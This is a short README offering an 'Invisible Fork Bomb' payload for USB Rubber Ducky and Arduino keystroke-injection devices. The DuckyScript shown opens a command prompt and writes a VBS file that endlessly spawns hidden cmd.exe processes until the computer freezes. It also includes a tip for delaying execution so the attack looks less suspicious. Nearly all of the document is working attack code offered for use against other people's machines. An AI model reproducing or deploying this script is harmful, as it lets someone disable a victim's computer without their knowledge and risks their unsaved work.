# Invisible Fork Bomb for Arduino and Ducky
The script creates and starts a vbs that executes exponentially cmd.exe without visible windows (Fork bomb -> Freezes the PC).

# About...
Author: BlueArduino20

Version 1.0

# Code for Rubber Ducky

<pre><code>DELAY 1000
REM ^ You should set more delay time if your computer is slow or if the script doesn't work correctly.
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING copy con forkb.vbs
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
STRING start forkb.vbs && exit
REM You can add this: ">null ping localhost -n 5 && " before "start" to make a (5 sec) delay before the vbs execution. (By this way it's less suspicious)
ENTER
</pre></code>

# Code for Arduino

<a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb.ino">Invisible_fork_bomb.ino<a>
